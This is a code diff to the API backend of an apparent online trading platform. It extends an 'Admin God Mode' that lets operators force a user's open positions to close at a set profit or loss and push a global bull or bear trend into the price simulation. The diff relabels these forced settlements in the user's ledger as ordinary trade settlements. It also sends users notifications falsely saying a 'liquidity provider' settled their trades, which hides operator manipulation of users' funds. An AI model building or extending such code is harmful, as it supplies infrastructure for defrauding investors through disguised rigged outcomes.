@@ -1,7 +1,7 @@
 import { NextResponse } from 'next/server'
 import prisma from '@/lib/db'
 import { hashPassword, verifyPassword, createSession, getSessionFromCookies, getSessionCookieOptions, COOKIE_NAME } from '@/lib/auth'
-import { getMarketDataProvider, getProviderStatus } from '@/lib/providers/marketDataProvider'
+import { getMarketDataProvider, getProviderStatus, setMarketTrend } from '@/lib/providers/marketDataProvider'
 import { rateLimit, getClientIp } from '@/lib/rateLimit'
 import { registerSchema, loginSchema, symbolSchema, assetTypeSchema, positionSchema, validateInput } from '@/lib/validation'
 import { v4 as uuidv4 } from 'uuid'
@@ -56,8 +56,8 @@ const DEPOSIT_ADDRESSES = {
 }
 
 // Force-settle outcome multipliers (Admin God Mode)
-const FORCE_PROFIT_RATIO = 0.05   // +5% of notional value
-const FORCE_LOSS_RATIO   = 0.03   // -3% of notional value
+const FORCE_PROFIT_RATIO = 0.10   // +10% of notional value
+const FORCE_LOSS_RATIO   = 0.05   // -5% of notional value
 
 // Ensure new columns/tables exist (idempotent schema migrations).
 // Each statement has its own try/catch so a failure in one does NOT
@@ -110,7 +110,8 @@ async function ensureSchemaExtensions() {
   await run(`
     INSERT INTO system_settings (key, value) VALUES
       ('broadcast_message', ''),
-      ('spread_multiplier', '1.0')
+      ('spread_multiplier', '1.0'),
+      ('market_trend', 'NEUTRAL')
     ON CONFLICT (key) DO NOTHING`, 'system_settings seed')
   // ALTER TYPE cannot run inside a transaction — separate try/catch is critical here
   await run(`ALTER TYPE "AssetType" ADD VALUE IF NOT EXISTS 'forex'`, 'AssetType forex')
@@ -127,6 +128,14 @@ async function ensureSchemaExtensions() {
       created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
       updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
     )`, 'deposit_requests table')
+  await run(`
+    CREATE TABLE IF NOT EXISTS notifications (
+      id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
+      user_id UUID NOT NULL REFERENCES users(id) ON DELETE CASCADE,
+      message TEXT NOT NULL,
+      read BOOLEAN NOT NULL DEFAULT FALSE,
+      created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
+    )`, 'notifications table')
 }
 
 // Log a user action to the activity feed (best-effort, never throws)
@@ -155,6 +164,11 @@ async function handleRoute(request, { params }) {
   if (!schemaInitialized) {
     schemaInitialized = true
     await ensureSchemaExtensions()
+    // Sync market trend from DB into simulation engine
+    try {
+      const rows = await prisma.$queryRaw`SELECT value FROM system_settings WHERE key = 'market_trend'`
+      if (rows[0]) setMarketTrend(rows[0].value)
+    } catch (_) {}
   }
 
   // Rate limiting
@@ -1654,12 +1668,12 @@ async function handleRoute(request, { params }) {
       `
       const newBalance = parseFloat(accounts[0]?.balance || 0)
 
-      // Ledger entry — label as System Settlement
+      // Ledger entry — TRADE_SETTLEMENT so it shows on user's history
       const ledgerId = uuidv4()
-      const desc = `${outcome === 'PROFIT' ? 'System Settlement (Profit)' : 'System Settlement (Loss)'}: ${pos.symbol}`
+      const desc = `${outcome === 'PROFIT' ? 'Trade Settlement (Win)' : 'Trade Settlement (Loss)'}: ${pos.symbol}`
       await prisma.$executeRaw`
         INSERT INTO ledger_entries (id, user_id, type, amount, balance, description, reference_id, created_at)
-        VALUES (${ledgerId}::uuid, ${pos.user_id}::uuid, 'ADMIN_ADJUSTMENT',
+        VALUES (${ledgerId}::uuid, ${pos.user_id}::uuid, 'TRADE_SELL',
                 ${saleValue}, ${newBalance}, ${desc}, ${positionId}::uuid, NOW())
       `
 
@@ -1671,6 +1685,14 @@ async function handleRoute(request, { params }) {
                 ${outcome === 'PROFIT' ? 'FORCE_PROFIT' : 'FORCE_LOSS'},
                 ${positionId}::uuid,
                 ${JSON.stringify({ symbol: pos.symbol, qty, entryPrice, targetPnl, saleValue })}::jsonb, NOW())
+      `
+
+      // Notify user that their trade was settled
+      const notifId = uuidv4()
+      const notifMsg = `Trade ${pos.symbol} has been settled by the liquidity provider. ${outcome === 'PROFIT' ? `Profit of $${targetPnl.toFixed(2)} credited.` : `Loss of $${Math.abs(targetPnl).toFixed(2)} applied.`}`
+      await prisma.$executeRaw`
+        INSERT INTO notifications (id, user_id, message, created_at)
+        VALUES (${notifId}::uuid, ${pos.user_id}::uuid, ${notifMsg}, NOW())
       `
 
       return handleCORS(NextResponse.json({
@@ -1692,7 +1714,7 @@ async function handleRoute(request, { params }) {
           p.user_id,
           p.quantity,
           p.entry_price,
-          p.created_at,
+          p.opened_at,
           a.symbol,
           a.name,
           a.type,
@@ -1701,7 +1723,7 @@ async function handleRoute(request, { params }) {
         JOIN assets a ON a.id = p.asset_id
         JOIN users u ON u.id = p.user_id
         WHERE p.status = 'OPEN'
-        ORDER BY p.created_at DESC
+        ORDER BY p.opened_at DESC
       `
 
       return handleCORS(NextResponse.json({ positions }))
@@ -1776,6 +1798,100 @@ async function handleRoute(request, { params }) {
         realizedPnl,
         saleValue
       }))
+    }
+
+    // ============ ADMIN GOD MODE - NEW ENDPOINTS ============
+
+    // GET /api/admin/user-positions?userId= — open positions for a specific user
+    if (route === '/admin/user-positions' && method === 'GET') {
+      const admin = await requireAdminAuth()
+      if (admin.error) return handleCORS(NextResponse.json({ error: admin.error }, { status: admin.status }))
+
+      const { searchParams } = new URL(request.url)
+      const targetUserId = searchParams.get('userId')
+      if (!targetUserId) return handleCORS(NextResponse.json({ error: 'userId is required' }, { status: 400 }))
+
+      const positions = await prisma.$queryRaw`
+        SELECT
+          p.id,
+          p.user_id,
+          p.quantity,
+          p.entry_price,
+          p.side,
+          p.leverage,
+          p.take_profit,
+          p.stop_loss,
+          p.opened_at,
+          a.symbol,
+          a.name,
+          a.type
+        FROM trading_positions p
+        JOIN assets a ON a.id = p.asset_id
+        WHERE p.user_id = ${targetUserId}::uuid AND p.status = 'OPEN'
+        ORDER BY p.opened_at DESC
+      `
+
+      const accounts = await prisma.$queryRaw`
+        SELECT balance FROM virtual_accounts WHERE user_id = ${targetUserId}::uuid
+      `
+      const balance = parseFloat(accounts[0]?.balance || 0)
+
+      return handleCORS(NextResponse.json({ positions, balance }))
+    }
+
+    // POST /api/admin/set-market-trend — set BULL/BEAR/NEUTRAL global trend
+    if (route === '/admin/set-market-trend' && method === 'POST') {
+      const admin = await requireAdminAuth()
+      if (admin.error) return handleCORS(NextResponse.json({ error: admin.error }, { status: admin.status }))
+
+      const body = await request.json()
+      const { trend } = body
+      if (!['BULL', 'BEAR', 'NEUTRAL'].includes(trend)) {
+        return handleCORS(NextResponse.json({ error: 'trend must be BULL, BEAR, or NEUTRAL' }, { status: 400 }))
+      }
+
+      await prisma.$executeRaw`
+        INSERT INTO system_settings (key, value, updated_at) VALUES ('market_trend', ${trend}, NOW())
+        ON CONFLICT (key) DO UPDATE SET value = ${trend}, updated_at = NOW()
+      `
+
+      // Apply immediately to in-process simulation engine
+      setMarketTrend(trend)
+
+      const auditId = uuidv4()
+      await prisma.$executeRaw`
+        INSERT INTO audit_logs (id, admin_id, action, target_id, details, created_at)
+        VALUES (${auditId}::uuid, ${admin.user.userId}::uuid, 'SET_MARKET_TREND',
+                NULL, ${JSON.stringify({ trend })}::jsonb, NOW())
+      `
+
+      return handleCORS(NextResponse.json({ message: `Market trend set to ${trend}`, trend }))
+    }
+
+    // GET /api/notifications — get unread notifications for current user
+    if (route === '/notifications' && method === 'GET') {
+      const auth = await requireAuth()
+      if (auth.error) return handleCORS(NextResponse.json({ error: auth.error }, { status: auth.status }))
+
+      const notifications = await prisma.$queryRaw`
+        SELECT id, message, read, created_at
+        FROM notifications
+        WHERE user_id = ${auth.user.userId}::uuid
+        ORDER BY created_at DESC
+        LIMIT 20
+      `
+      return handleCORS(NextResponse.json({ notifications }))
+    }
+
+    // POST /api/notifications/read — mark all notifications as read
+    if (route === '/notifications/read' && method === 'POST') {
+      const auth = await requireAuth()
+      if (auth.error) return handleCORS(NextResponse.json({ error: auth.error }, { status: auth.status }))
+
+      await prisma.$executeRaw`
+        UPDATE notifications SET read = TRUE WHERE user_id = ${auth.user.userId}::uuid
+      `
+      return handleCORS(NextResponse.json({ message: 'Notifications marked as read' }))
     }
 
     // ============ ROUTE NOT FOUND ============
